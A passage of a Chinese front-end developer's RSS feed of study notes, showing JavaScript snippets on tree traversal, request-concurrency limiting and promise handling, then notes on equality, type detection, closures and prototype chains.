  <span>new</span> <span>Node</span><span>(</span><span>2</span><span>,</span> <span>new</span> <span>Node</span><span>(</span><span>4</span><span>)</span><span>,</span> <span>new</span> <span>Node</span><span>(</span><span>5</span><span>)</span><span>)</span><span>,</span>
  <span>new</span> <span>Node</span><span>(</span><span>3</span><span>,</span> <span>new</span> <span>Node</span><span>(</span><span>6</span><span>)</span><span>)</span>
<span>)</span>
console<span>.</span><span>log</span><span>(</span>root<span>)</span>

<span>// 递归</span>
<span>function</span> <span>dfs</span><span>(</span><span>root</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>root<span>)</span> <span>return</span>
  console<span>.</span><span>log</span><span>(</span>root<span>.</span>val<span>)</span>
  <span>dfs</span><span>(</span>root<span>.</span>left<span>)</span>
  <span>dfs</span><span>(</span>root<span>.</span>right<span>)</span>
<span>}</span>

console<span>.</span><span>log</span><span>(</span><span>'-------dfs--------'</span><span>)</span>
<span>dfs</span><span>(</span>root<span>)</span>

<span>// 非递归</span>
<span>function</span> <span>dfs</span><span>(</span><span>root</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>root<span>)</span> <span>return</span>
  <span>const</span> queue <span>=</span> <span>[</span>root<span>]</span>
  <span>while</span> <span>(</span>queue<span>.</span>length<span>)</span> <span>{</span>
    <span>const</span> cur <span>=</span> queue<span>.</span><span>pop</span><span>(</span><span>)</span>
    console<span>.</span><span>log</span><span>(</span>cur<span>.</span>val<span>)</span>
    <span>if</span> <span>(</span>cur<span>.</span>right<span>)</span> queue<span>.</span><span>push</span><span>(</span>cur<span>.</span>right<span>)</span>
    <span>if</span> <span>(</span>cur<span>.</span>left<span>)</span> queue<span>.</span><span>push</span><span>(</span>cur<span>.</span>left<span>)</span>
  <span>}</span>
<span>}</span>

console<span>.</span><span>log</span><span>(</span><span>'-------dfs--------'</span><span>)</span>
<span>dfs</span><span>(</span>root<span>)</span>

<span>function</span> <span>bfs</span><span>(</span><span>root</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>root<span>)</span> <span>return</span>
  <span>const</span> queue <span>=</span> <span>[</span>root<span>]</span>
  <span>while</span> <span>(</span>queue<span>.</span>length<span>)</span> <span>{</span>
    <span>const</span> len <span>=</span> queue<span>.</span>length
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> len<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>const</span> cur <span>=</span> queue<span>.</span><span>shift</span><span>(</span><span>)</span>
      console<span>.</span><span>log</span><span>(</span>cur<span>.</span>val<span>)</span>
      <span>if</span> <span>(</span>cur<span>.</span>left<span>)</span> queue<span>.</span><span>push</span><span>(</span>cur<span>.</span>left<span>)</span>
      <span>if</span> <span>(</span>cur<span>.</span>right<span>)</span> queue<span>.</span><span>push</span><span>(</span>cur<span>.</span>right<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

console<span>.</span><span>log</span><span>(</span><span>'-------bfs--------'</span><span>)</span>
<span>bfs</span><span>(</span>root<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br></div></div><ul>
<li><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/9" target="_blank" rel="noopener noreferrer">第 5 题：介绍下深度优先遍历和广度优先遍历，如何实现？ - 木易杨</a></li>
</ul>
<h2 id="_9-控制请求并发数量"> 9. 控制请求并发数量</h2>
<div><pre><code><span>const</span> <span>fetch</span> <span>=</span> <span>(</span><span>url<span>,</span> time</span><span>)</span> <span>=></span>
  <span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>resolve</span><span>(</span>url<span>)</span><span>,</span> time<span>)</span><span>)</span>

<span>const</span> task <span>=</span> <span>[</span>
  <span>(</span><span>)</span> <span>=></span> <span>fetch</span><span>(</span><span>'api-1'</span><span>,</span> <span>2000</span><span>)</span><span>,</span>
  <span>(</span><span>)</span> <span>=></span> <span>fetch</span><span>(</span><span>'api-2'</span><span>,</span> <span>1000</span><span>)</span><span>,</span>
  <span>(</span><span>)</span> <span>=></span> <span>fetch</span><span>(</span><span>'api-3'</span><span>,</span> <span>1000</span><span>)</span><span>,</span>
  <span>(</span><span>)</span> <span>=></span> <span>fetch</span><span>(</span><span>'api-4'</span><span>,</span> <span>2000</span><span>)</span><span>,</span>
  <span>(</span><span>)</span> <span>=></span> <span>fetch</span><span>(</span><span>'api-5'</span><span>,</span> <span>2000</span><span>)</span><span>,</span>
  <span>(</span><span>)</span> <span>=></span> <span>fetch</span><span>(</span><span>'api-6'</span><span>,</span> <span>1000</span><span>)</span><span>,</span>
<span>]</span>

<span>const</span> <span>fetchLimit</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> limit <span>=</span> <span>pLimit</span><span>(</span><span>2</span><span>)</span>
  <span>const</span> promises <span>=</span> task<span>.</span><span>map</span><span>(</span><span>t</span> <span>=></span> <span>limit</span><span>(</span>t<span>)</span><span>)</span>

  console<span>.</span><span>time</span><span>(</span><span>'p-limit'</span><span>)</span>
  <span>const</span> res <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span>promises<span>)</span>
  console<span>.</span><span>log</span><span>(</span>res<span>)</span>
  console<span>.</span><span>timeEnd</span><span>(</span><span>'p-limit'</span><span>)</span>
<span>}</span>

<span>const</span> <span>pLimit</span> <span>=</span> <span>concurrency</span> <span>=></span> <span>{</span>
  <span>const</span> queue <span>=</span> <span>[</span><span>]</span>
  <span>let</span> activeCount <span>=</span> <span>0</span>

  <span>const</span> <span>run</span> <span>=</span> <span>async</span> <span>(</span><span>fn<span>,</span> resolve<span>,</span> args</span><span>)</span> <span>=></span> <span>{</span>
    activeCount<span>++</span>
    <span>const</span> result <span>=</span> <span>await</span> <span>fn</span><span>(</span><span>...</span>args<span>)</span>
    <span>resolve</span><span>(</span>result<span>)</span>

    activeCount<span>--</span>
    <span>if</span> <span>(</span>queue<span>.</span>length<span>)</span> queue<span>.</span><span>shift</span><span>(</span><span>)</span><span>(</span><span>)</span>
  <span>}</span>

  <span>const</span> <span>enqueue</span> <span>=</span> <span>(</span><span>fn<span>,</span> resolve<span>,</span> args</span><span>)</span> <span>=></span> <span>{</span>
    queue<span>.</span><span>push</span><span>(</span><span>run</span><span>.</span><span>bind</span><span>(</span><span>null</span><span>,</span> fn<span>,</span> resolve<span>,</span> args<span>)</span><span>)</span>
    <span>// 确保activeCount是最新值</span>
    <span>;</span><span>(</span><span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>await</span> Promise<span>.</span><span>resolve</span><span>(</span><span>)</span>
      <span>if</span> <span>(</span>activeCount <span>&lt;</span> concurrency <span>&amp;&amp;</span> queue<span>.</span>length<span>)</span> queue<span>.</span><span>shift</span><span>(</span><span>)</span><span>(</span><span>)</span>
    <span>}</span><span>)</span><span>(</span><span>)</span>
  <span>}</span>

  <span>const</span> <span>generator</span> <span>=</span> <span>(</span><span>fn<span>,</span> <span>...</span>args</span><span>)</span> <span>=></span>
    <span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>enqueue</span><span>(</span>fn<span>,</span> resolve<span>,</span> args<span>)</span><span>)</span>

  <span>return</span> generator
<span>}</span>

<span>fetchLimit</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br></div></div><ul>
<li><a href="https://github.com/sindresorhus/p-limit#readme" target="_blank" rel="noopener noreferrer">p-limit - sindresorhus</a></li>
</ul>
<h2 id="_10-连续触发时-若上一次-promise-执行未结束则直接废弃-只有最后一次-promise-会触发-then-reject"> 10. 连续触发时，若上一次 promise 执行未结束则直接废弃，只有最后一次 promise 会触发 then/reject</h2>
<div><pre><code><span>let</span> count <span>=</span> <span>1</span>
<span>const</span> <span>promiseFunction</span> <span>=</span> <span>(</span><span>)</span> <span>=></span>
  <span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>resolve</span><span>(</span>count<span>++</span><span>)</span><span>)</span><span>)</span>

<span>const</span> <span>lastPromise</span> <span>=</span> <span>p</span> <span>=></span> <span>{</span>
  <span>const</span> cbs <span>=</span> <span>[</span><span>]</span>
  <span>return</span> <span>(</span><span>)</span> <span>=></span>
    <span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>{</span>
      cbs<span>.</span><span>push</span><span>(</span>resolve<span>)</span>
      <span>p</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>res</span> <span>=></span> <span>{</span>
        <span>if</span> <span>(</span>resolve <span>===</span> cbs<span>.</span><span>slice</span><span>(</span><span>-</span><span>1</span><span>)</span><span>[</span><span>0</span><span>]</span><span>)</span> <span>resolve</span><span>(</span>res<span>)</span>
      <span>}</span><span>)</span>
    <span>}</span><span>)</span>
<span>}</span>

<span>const</span> lastFn <span>=</span> <span>lastPromise</span><span>(</span>promiseFunction<span>)</span>

<span>lastFn</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span> <span>// 无输出</span>
<span>lastFn</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span> <span>// 无输出</span>
<span>lastFn</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span> <span>// 3</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>JS</title>
      <link>https://www.matrixtheone.ga/web/memo/JS/</link>
      <guid>https://www.matrixtheone.ga/web/memo/JS/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JS</source>
      <category>JS 高级</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-判断方式"> 1. 判断方式</h2>
<ul>
<li>
<ol>
<li>两个等号会进行类型转换。</li>
</ol>
<blockquote>
<ol>
<li>对象 == 对象：比较地址。</li>
<li>对象 == 字符串：对象变为字符串。</li>
<li>NaN == NaN：和自己及其他值都不相等。</li>
<li>null == undefined：在 == 相等，=== 不相等，并和其他值都不相等。</li>
<li>剩下情况，只要两边类型不同，最后都转为数字。</li>
</ol>
</blockquote>
<div><pre><code><span>{</span><span>}</span> <span>==</span> <span>{</span><span>}</span> <span>// => false</span>
<span>(</span><span>{</span><span>}</span><span>)</span> <span>==</span> <span>'[object Object]'</span> <span>// => true</span>
<span>NaN</span> <span>==</span> <span>NaN</span> <span>// => false</span>
<span>null</span> <span>==</span> <span>undefined</span> <span>// => true</span>
<span>null</span> <span>==</span> <span>''</span> <span>||</span> <span>null</span> <span>==</span> <span>0</span> <span>||</span> <span>null</span> <span>==</span> <span>false</span> <span>// => false</span>
<span>0</span> <span>==</span> <span>'\n'</span> <span>||</span> <span>0</span> <span>==</span> <span>'  '</span> <span>// true</span>

<span>// 拆封调用 toString() 方法</span>
<span>'abc'</span> <span>==</span> <span>Object</span><span>(</span><span>'abc'</span><span>)</span> <span>// => true</span>
<span>// null 与 undefined 不能够被封装，Object(null) 和 Object(undefined) 返回空对象（{}）</span>
<span>null</span> <span>==</span> <span>Object</span><span>(</span><span>null</span><span>)</span> <span>||</span> <span>undefined</span> <span>==</span> <span>Object</span><span>(</span><span>undefined</span><span>)</span> <span>// => false</span>

<span>// 转换过程：（'' -> 0 ） == （[null] -> '' -> 0）</span>
<span>''</span> <span>==</span> <span>[</span><span>null</span><span>]</span> <span>// true</span>
<span>// 转换过程：（[] -> '' -> 0 ） == （![] -> false -> 0）</span>
<span>[</span><span>]</span> <span>==</span> <span>!</span><span>[</span><span>]</span> <span>// true</span>
<span>// 转换过程：（{} -> '[object Object]' -> NaN ） == （!{} -> false -> 0）</span>
<span>{</span><span>}</span> <span>==</span> <span>!</span><span>{</span><span>}</span> <span>// false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div></li>
<li>
<ol start="2">
<li>三个等号基本数据类型比较值，复杂数据类型比较内存地址（用的最多）。</li>
</ol>
<blockquote>
<p>存在 -0 和 +0 比较为 true，NaN 和 NaN 比较为 false 的情况。</p>
</blockquote>
<div><pre><code><span>-</span><span>0</span> <span>===</span> <span>+</span><span>0</span> <span>// => true</span>
<span>NaN</span> <span>===</span> <span>NaN</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<ol start="3">
<li>Object.is() 最准确的比较方式，但效率不高，主要用来解决三个等号的缺陷（NaN 可用 Number.isNaN() 方法判断）。</li>
</ol>
<div><pre><code>Object<span>.</span><span>is</span><span>(</span><span>-</span><span>0</span><span>,</span> <span>+</span><span>0</span><span>)</span> <span>// => false</span>
Object<span>.</span><span>is</span><span>(</span><span>NaN</span><span>,</span> <span>NaN</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
</ul>
<h2 id="_2-数据类型检测"> 2. 数据类型检测</h2>
<ul>
<li>
<ol>
<li>typeof 基于二进制值的前三位进行检测，检测对象、数组、正则、日期、null 等均为 'object'，可用于检测除 null 以外的基本数据类型。</li>
</ol>
<blockquote>
<p>JS 设计时，二进制值前三位都是 0 就会被判断为对象，而 null 的二进制值都是 0，所以 typeof null 为 'object'。</p>
</blockquote>
<div><pre><code><span>typeof</span> <span>7</span> <span>// => 'number'</span>
<span>typeof</span> <span>'7'</span> <span>// => 'string'</span>
<span>typeof</span> <span>true</span> <span>// => 'boolean'</span>
<span>typeof</span> <span>null</span> <span>// => 'object'</span>
<span>typeof</span> <span>undefined</span> <span>// => 'undefined'</span>
<span>typeof</span> <span>NaN</span> <span>// => 'number'</span>
<span>typeof</span> <span>Symbol</span><span>(</span><span>7</span><span>)</span> <span>// => 'symbol'</span>
<span>typeof</span> <span>7n</span> <span>// => 'bigint'</span>
<span>typeof</span> <span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span><span>}</span> <span>// => 'function'</span>
<span>typeof</span> <span>[</span><span>]</span> <span>// => 'object'</span>
<span>typeof</span> <span>{</span><span>}</span> <span>// => 'object'</span>
<span>typeof</span> <span>/</span><span>7</span><span>/</span> <span>// => 'object'</span>
<span>typeof</span> <span>new</span> <span>Date</span><span>(</span><span>)</span> <span>// => 'object'</span>
<span>typeof</span> <span>new</span> <span>Set</span><span>(</span><span>)</span> <span>// => 'object'</span>
<span>typeof</span> <span>new</span> <span>Map</span><span>(</span><span>)</span> <span>// => 'object'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div></li>
<li>
<ol start="2">
<li>instanceof 检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上（foo instanceof Bar 为检测 foo.__proto__ === Bar.prototype），不能检测基本数据类型，检测复杂数据类型是否属于 Object 均为 true。</li>
</ol>
<blockquote>
<p>因开发人员可以自行修改原型链，因此此方式也是较为不安全的。</p>
</blockquote>
<div><pre><code><span>7</span> <span>instanceof</span> <span>Number</span> <span>// => false</span>
<span>'7'</span> <span>instanceof</span> <span>String</span> <span>// => false</span>
<span>true</span> <span>instanceof</span> <span>Boolean</span> <span>// => false</span>
<span>NaN</span> <span>instanceof</span> <span>Number</span> <span>// => false</span>
<span>Symbol</span><span>(</span><span>7</span><span>)</span> <span>instanceof</span> <span>Symbol</span> <span>// => false</span>
<span>7n</span> <span>instanceof</span> <span>BigInt</span> <span>// => false</span>
<span>(</span><span>function</span> <span>foo</span> <span>(</span><span>)</span> <span>{</span><span>}</span><span>)</span> <span>instanceof</span> <span>Function</span> <span>// => true</span>
<span>[</span><span>]</span> <span>instanceof</span> <span>Array</span> <span>// => true</span>
<span>(</span><span>{</span><span>}</span><span>)</span> <span>instanceof</span> <span>Object</span> <span>// => true</span>
<span>/</span><span>7</span><span>/</span> <span>instanceof</span> <span>RegExp</span> <span>// => true</span>
<span>new</span> <span>Date</span><span>(</span><span>)</span> <span>instanceof</span> <span>Date</span> <span>// => true</span>
<span>new</span> <span>Set</span><span>(</span><span>)</span> <span>instanceof</span> <span>Set</span> <span>// => true</span>
<span>new</span> <span>Map</span><span>(</span><span>)</span> <span>instanceof</span> <span>Map</span> <span>// => true</span>

<span>[</span><span>function</span> <span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span> <span>{</span><span>}</span><span>,</span> <span>[</span><span>]</span><span>,</span> <span><span>/</span><span>7</span><span>/</span></span><span>,</span> <span>new</span> <span>Date</span><span>(</span><span>)</span><span>,</span> <span>new</span> <span>Set</span><span>(</span><span>)</span><span>,</span> <span>new</span> <span>Map</span><span>(</span><span>)</span><span>]</span><span>.</span><span>every</span><span>(</span><span>i</span> <span>=></span> i <span>instanceof</span> <span>Object</span><span>)</span> <span>// => true</span>

<span>// 更改原型链指向</span>
<span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span><span>}</span>
foo<span>.</span>prototype <span>=</span> Object<span>.</span><span>create</span><span>(</span><span>Array</span><span>.</span>prototype<span>)</span>
<span>new</span> <span>foo</span><span>(</span><span>)</span> <span>instanceof</span> <span>Array</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div></li>
<li>
<ol start="3">
<li>constructor 为原型链上构造函数的属性（obj.__proto__.constructor），指向构造函数本身。不能检测 undefined 和 null。</li>
</ol>
<blockquote>
<p>因开发人员可以自行修改原型链中的属性，因此此方式也是较为不安全的。</p>
</blockquote>
<div><pre><code><span>7.</span><span>.</span>constructor <span>===</span> Number <span>// => true</span>
<span>'7'</span><span>.</span>constructor <span>===</span> String <span>// => true</span>
<span>true</span><span>.</span>constructor <span>===</span> Boolean <span>// => true</span>
<span>NaN</span><span>.</span>constructor <span>===</span> Number <span>// => true</span>
<span>Symbol</span><span>(</span><span>7</span><span>)</span><span>.</span>constructor <span>===</span> Symbol <span>// true</span>
<span>7n</span><span>.</span>constructor <span>===</span> BigInt <span>// true</span>
<span>(</span><span>function</span> <span>foo</span> <span>(</span><span>)</span> <span>{</span><span>}</span><span>)</span><span>.</span>constructor <span>===</span> Function <span>// => true</span>
<span>[</span><span>]</span><span>.</span>constructor <span>===</span> Array <span>// => true</span>
<span>(</span><span>{</span><span>}</span><span>)</span><span>.</span>constructor <span>===</span> Object <span>// => true</span>
<span>/</span><span>7</span><span>/</span><span>.</span>constructor <span>===</span> RegExp <span>// => true</span>
<span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span>constructor <span>===</span> Date <span>// => true</span>
<span>new</span> <span>Set</span><span>(</span><span>)</span><span>.</span>constructor <span>===</span> Set <span>// => true</span>
<span>new</span> <span>Map</span><span>(</span><span>)</span><span>.</span>constructor <span>===</span> Map <span>// => true</span>

<span>// 更改构造函数中的 constructor 属性</span>
<span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span><span>}</span>
foo<span>.</span>prototype<span>.</span>constructor <span>=</span> Array
<span>new</span> <span>foo</span><span>(</span><span>)</span><span>.</span>constructor <span>===</span> Array <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div></li>
<li>
<ol start="4">
<li>通过 Object.prototype.toString.call() 获取对象的类型（最全面的检测方式）。</li>
</ol>
<div><pre><code><span>const</span> toString <span>=</span> <span>{</span><span>}</span><span>.</span>toString
<span>toString</span><span>.</span><span>call</span><span>(</span><span>7</span><span>)</span> <span>// => '[object Number]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>'7'</span><span>)</span> <span>// => '[object String]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>true</span><span>)</span> <span>// => '[object Boolean]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>null</span><span>)</span> <span>// => '[object Null]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>undefined</span><span>)</span> <span>// => '[object Undefined]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>NaN</span><span>)</span> <span>// => '[object Number]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>Symbol</span><span>(</span><span>7</span><span>)</span><span>)</span> <span>// => '[object Symbol]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>7n</span><span>)</span> <span>// => '[object BigInt]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>)</span> <span>// => '[object Function]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>[</span><span>]</span><span>)</span> <span>// => '[object Array]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>{</span><span>}</span><span>)</span> <span>// => '[object Object]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span><span>/</span><span>7</span><span>/</span></span><span>)</span> <span>// => '[object RegExp]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span> <span>// => '[object Date]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>new</span> <span>Set</span><span>(</span><span>)</span><span>)</span> <span>// => '[object Set]'</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>new</span> <span>Map</span><span>(</span><span>)</span><span>)</span> <span>// => '[object Map]'</span>

<span>function</span> <span>Foo</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>toString</span><span>.</span><span>call</span><span>(</span><span>new</span> <span>Foo</span><span>(</span><span>)</span><span>)</span> <span>// => '[object Object]'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
<li>
<p>封装类型检测方法。</p>
<div><pre><code><span>const</span> <span>detectionType</span> <span>=</span> <span>value</span> <span>=></span>
  <span>typeof</span> value <span>===</span> <span>'object'</span>
    <span>?</span> <span>{</span><span>}</span><span>.</span><span>toString</span><span>.</span><span>call</span><span>(</span>value<span>)</span><span>.</span><span>slice</span><span>(</span><span>8</span><span>,</span> <span>-</span><span>1</span><span>)</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span>
    <span>:</span> <span>typeof</span> value
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
</ul>
<h2 id="_3-栈和堆"> 3. 栈和堆</h2>
<ul>
<li>
<p>栈（Stack）是内存中一块用于存储局部变量和函数参数的线性结构，遵循着后入先出的原则（储存基本类型数据）。</p>
</li>
<li>
<p>堆（Heap）数据结构是一种树状结构，在栈中保留对象在堆中的地址，按引用访问（储存引用类型数据）。</p>
</li>
<li>
<p>一段代码的执行会经过压栈（执行栈 ECStack） -&gt; 执行上下文 -&gt; 执行代码 -&gt; 出栈的操作。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>fn1</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>num <span>&lt;</span> <span>3</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// 打印顺序 1 -> 2</span>
    num<span>++</span>
    <span>fn1</span><span>(</span>num<span>)</span>
    console<span>.</span><span>log</span><span>(</span>num<span>)</span> <span>// 打印顺序 3 -> 2</span>
  <span>}</span>
<span>}</span>

<span>fn1</span><span>(</span><span>1</span><span>)</span> <span>// 打印顺序 1 -> 2 -> 3 -> 2</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li><a href="https://www.pzijun.cn/blog/1/1.6.html#js-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B" target="_blank" rel="noopener noreferrer">什么变量保存在堆/栈中？ - 前端瓶子君</a></li>
</ul>
<h2 id="_4-闭包-closure"> 4. 闭包（Closure）</h2>
<ul>
<li>
<p>一个函数和对其周围状态（lexical environment，词法环境）的引用捆绑在一起（或者说函数被引用包围），这样的组合就是闭包（closure） — <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures" target="_blank" rel="noopener noreferrer">MDN</a>。</p>
</li>
<li>
<p>当函数可以记住并访问所在的词法作用域，即使函数是在当前词法作用域之外执行，这时就产生了闭包 — 《你不知道的 JavaScript（上）》。</p>
</li>
<li>
<p>闭包的两大特性。</p>
<blockquote>
<ol>
<li>保护：保护私有变量不受外界干扰。</li>
<li>保存：形成不销毁栈内存，存储一些值。</li>
</ol>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>outer</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> a <span>=</span> <span>1</span>
  <span>return</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>++</span>a<span>)</span>
  <span>}</span>
<span>}</span>

<span>const</span> inner <span>=</span> <span>outer</span><span>(</span><span>)</span>
<span>inner</span><span>(</span><span>)</span> <span>// => 2</span>
<span>inner</span><span>(</span><span>)</span> <span>// => 3</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_5-原型链"> 5. 原型链</h2>
<ul>
<li>
<p>原型链是实例对象和原型之间构成的有限链，原型链分为显示原型（prototype）和隐式原型（__proto__）。</p>
</li>
<li>
<p>显示原型是构造函数才拥有的属性，隐式原型属性在构造函数和实例对象中均有，实例对象的隐式原型指向构造函数的显示原型。</p>
</li>
<li>
<p>当访问对象中的某个属性时，会通过原型链依次查找，直到 Object 的隐式原型 null。</p>
</li>
<li>
<p>在开发中会通过给构造函数的显示原型添加公用属性或方法，方便实例引用。例如在 Vue 构造函数显示原型中添加 $log 方法（Vue.prototype.$log = console.log），在 template 模板上就可以通过 $log() 打印数据了。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>)</span> <span>{</span><span>}</span>

<span>const</span> f <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>)</span>

f<span>.</span>prototype <span>// => undefined</span>

f<span>.</span>__proto__ <span>===</span> <span>Foo</span><span>.</span>prototype <span>// => true</span>
<span>Foo</span><span>.</span>prototype<span>.</span>__proto__ <span>===</span> <span>Object</span><span>.</span>prototype <span>// => true</span>
<span>Object</span><span>.</span>prototype<span>.</span>__proto__ <span>===</span> <span>null</span> <span>// => true</span>
Object<span>.</span>__proto__ <span>===</span> <span>Function</span><span>.</span>prototype <span>// => true</span>

Foo<span>.</span>__proto__ <span>===</span> <span>Function</span><span>.</span>prototype <span>// => true</span>
